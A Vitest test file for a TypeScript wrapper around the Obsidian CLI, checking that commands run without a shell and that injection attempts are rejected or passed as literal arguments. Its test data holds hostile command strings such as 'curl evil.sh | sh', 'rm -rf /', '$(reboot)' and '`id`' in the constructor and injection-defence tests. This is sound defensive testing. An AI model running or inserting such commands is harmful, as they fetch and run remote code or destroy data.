import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { VaultOps, validateVaultCliPath } from './ops.js';

// Mock child_process — the vault ops must spawn WITHOUT a shell (shell: false)
// via execFileSync, passing every argument as a raw argv element.
vi.mock('node:child_process', () => ({
  execFileSync: vi.fn(),
}));

import { execFileSync } from 'node:child_process';
const mockExecFileSync = vi.mocked(execFileSync);

/** Convenience: the (file, args, options) tuple of the Nth execFileSync call. */
function callAt(index: number): { file: string; args: string[]; options: Record<string, unknown> } {
  const call = mockExecFileSync.mock.calls[index] as unknown as [string, string[], Record<string, unknown>];
  return { file: call[0], args: call[1], options: call[2] };
}

describe('VaultOps', () => {
  let ops: VaultOps;

  beforeEach(() => {
    ops = new VaultOps({ vaultName: 'TestVault' });
    mockExecFileSync.mockReset();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('constructor', () => {
    it('requires vaultName', () => {
      expect(() => new VaultOps({ vaultName: '' })).toThrow('requires a vaultName');
    });

    it('accepts custom config', () => {
      const custom = new VaultOps({
        vaultName: 'MyVault',
        cliPath: '/usr/bin/obsidian',
        timeoutMs: 5000,
      });
      expect(custom).toBeDefined();
    });

    it('rejects a cliPath containing shell metacharacters at construction (bead lget)', () => {
      // The exact poisoned value from the finding — must never construct.
      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'obsidian; curl evil.sh | sh' }))
        .toThrow(/Refusing to use Obsidian CLI path/);
      // A few more classic injection payloads.
      expect(() => new VaultOps({ vaultName: 'V', cliPath: '$(reboot)' }))
        .toThrow(/Refusing to use Obsidian CLI path/);
      expect(() => new VaultOps({ vaultName: 'V', cliPath: '`id`' }))
        .toThrow(/Refusing to use Obsidian CLI path/);
      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'obsidian && rm -rf /' }))
        .toThrow(/Refusing to use Obsidian CLI path/);
    });

    it('rejects a relative (non-absolute, path-bearing) cliPath', () => {
      expect(() => new VaultOps({ vaultName: 'V', cliPath: './obsidian' }))
        .toThrow(/absolute path or a bare command name/);
      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'bin/obsidian' }))
        .toThrow(/absolute path or a bare command name/);
    });
  });

  describe('validateVaultCliPath', () => {
    it('accepts a bare command name', () => {
      expect(validateVaultCliPath('obsidian')).toBe('obsidian');
    });
    it('accepts an absolute path', () => {
      expect(validateVaultCliPath('/usr/local/bin/obsidian-cli')).toBe('/usr/local/bin/obsidian-cli');
    });
    it('rejects empty', () => {
      expect(() => validateVaultCliPath('')).toThrow(/required/);
    });
    it('rejects whitespace and metacharacters', () => {
      for (const bad of ['obsidian cli', 'obsidian;id', 'a|b', 'a>b', 'a$b', "a'b", 'a"b', 'a\nb']) {
        expect(() => validateVaultCliPath(bad)).toThrow();
      }
    });
  });

  describe('write', () => {
    it('creates a note with a raw argv array (no shell, no quoting)', async () => {
      mockExecFileSync.mockReturnValue('');
      const result = await ops.write('My Note', 'Hello world');
      expect(result).toEqual({ name: 'My Note', folder: undefined, mode: 'create' });

      const { file, args, options } = callAt(0);
      expect(file).toBe('obsidian');
      expect(options.shell).toBe(false);
      // Each argument is a single raw argv element — no surrounding quotes.
      expect(args).toEqual([
        'vault=TestVault',
        'create',
        'name=My Note',
        'content=Hello world',
      ]);
    });

    it('includes folder when specified', async () => {
      mockExecFileSync.mockReturnValue('');
      const result = await ops.write('Entry', 'Content', { folder: 'Journal/' });
      expect(result.folder).toBe('Journal/');
      expect(callAt(0).args).toContain('path=Journal/');
    });

    it('uses append mode correctly', async () => {
      mockExecFileSync.mockReturnValue('');
      const result = await ops.write('Existing', 'More text', { mode: 'append' });
      expect(result.mode).toBe('append');
      const { args } = callAt(0);
      expect(args).toContain('append');
      expect(args).toContain('file=Existing');
    });

    it('uses prepend mode correctly', async () => {
      mockExecFileSync.mockReturnValue('');
      const result = await ops.write('Existing', 'Top text', { mode: 'prepend' });
      expect(result.mode).toBe('prepend');
      expect(callAt(0).args).toContain('prepend');
    });
  });

  describe('read', () => {
    it('reads note content', async () => {
      mockExecFileSync.mockReturnValue('# My Note\nSome content\n');
      const result = await ops.read('My Note');
      expect(result.name).toBe('My Note');
      expect(result.content).toBe('# My Note\nSome content');

      const { args } = callAt(0);
      expect(args).toContain('read');
      expect(args).toContain('file=My Note');
    });
  });

  describe('search', () => {
    it('parses JSON search results', async () => {
      mockExecFileSync.mockReturnValue(JSON.stringify([
        { path: 'Journal/entry.md', snippet: 'test snippet' },
        { path: 'Notes/other.md' },
      ]));
      const result = await ops.search('test query', 10);
      expect(result.query).toBe('test query');
      expect(result.results).toHaveLength(2);
      expect(result.results[0]).toEqual({ path: 'Journal/entry.md', snippet: 'test snippet' });
      expect(result.results[1]).toEqual({ path: 'Notes/other.md', snippet: undefined });
    });

    it('falls back to line-delimited paths for non-JSON output', async () => {
      mockExecFileSync.mockReturnValue('Journal/entry.md\nNotes/other.md\n');
      const result = await ops.search('query');
      expect(result.results).toHaveLength(2);
      expect(result.results[0].path).toBe('Journal/entry.md');
    });

    it('includes limit in args', async () => {
      mockExecFileSync.mockReturnValue('[]');
      await ops.search('query', 5);
      expect(callAt(0).args).toContain('limit=5');
    });
  });

  describe('daily', () => {
    it('reads daily note when no content provided', async () => {
      mockExecFileSync.mockReturnValue('Daily content\n');
      const result = await ops.daily();
      expect(result.mode).toBe('read');
      expect(result.content).toBe('Daily content');
      expect(callAt(0).args).toContain('daily:read');
    });

    it('appends to daily note when content provided', async () => {
      mockExecFileSync.mockReturnValue('');
      const result = await ops.daily({ content: 'New thought' });
      expect(result.mode).toBe('append');
      expect(result.content).toBeUndefined();
      const { args } = callAt(0);
      expect(args).toContain('daily:append');
      expect(args).toContain('content=New thought');
    });
  });

  describe('command injection defence (bead lget)', () => {
    it('passes shell metacharacters in a note title as a single literal argv token', async () => {
      mockExecFileSync.mockReturnValue('');
      // A malicious note title. With shell: false this is inert — a single arg.
      const evilTitle = 'pwn; rm -rf / && curl evil.sh | sh';
      await ops.write(evilTitle, 'body');

      const { file, args, options } = callAt(0);
      expect(file).toBe('obsidian');
      expect(options.shell).toBe(false);
      // The metacharacter payload is ONE argv element, not split into a command.
      expect(args).toContain(`name=${evilTitle}`);
      // No argv element was spawned as a separate `rm`/`curl` command.
      expect(args.some(a => a.trim() === 'rm' || a.trim() === 'curl')).toBe(false);
    });

    it('passes metacharacters in a daily-append date/content as literal argv', async () => {
      mockExecFileSync.mockReturnValue('');
      const evil = '2026-01-01`reboot`';
      await ops.daily({ content: evil });
      expect(callAt(0).args).toContain(`content=${evil}`);
    });

    it('passes metacharacters in a search query as a literal argv token', async () => {
      mockExecFileSync.mockReturnValue('[]');
      const evil = 'foo$(id)bar';
      await ops.search(evil);
      expect(callAt(0).args).toContain(`query=${evil}`);
    });
  });

  describe('error handling', () => {
    it('maps ENOENT to "command not found" error', async () => {
      mockExecFileSync.mockImplementation(() => {
        const err = new Error('ENOENT') as Error & { stderr: string };
        err.stderr = 'ENOENT: obsidian not found';
        throw err;
      });
      await expect(ops.read('test')).rejects.toThrow('obsidian command not found');
    });

    it('maps IPC errors to "app not running" error', async () => {
      vi.useFakeTimers();
      mockExecFileSync.mockImplementation(() => {
        const err = new Error('IPC') as Error & { stderr: string };
        err.stderr = 'Failed to connect via IPC';
        throw err;
      });
      try {
        const readPromise = ops.read('test');
        const rejection = expect(readPromise).rejects.toThrow(
          'Obsidian desktop app is not running',
        );
        await vi.runAllTimersAsync();
        await rejection;
      } finally {
        vi.useRealTimers();
      }
    });

    it('passes through timeout config to execFileSync', () => {
      const custom = new VaultOps({ vaultName: 'V', timeoutMs: 5000 });
      mockExecFileSync.mockReturnValue('');
      custom.read('test');
      expect(mockExecFileSync).toHaveBeenCalledWith(
        'obsidian',
        expect.any(Array),
        expect.objectContaining({ timeout: 5000, shell: false }),
      );
    });
  });
});
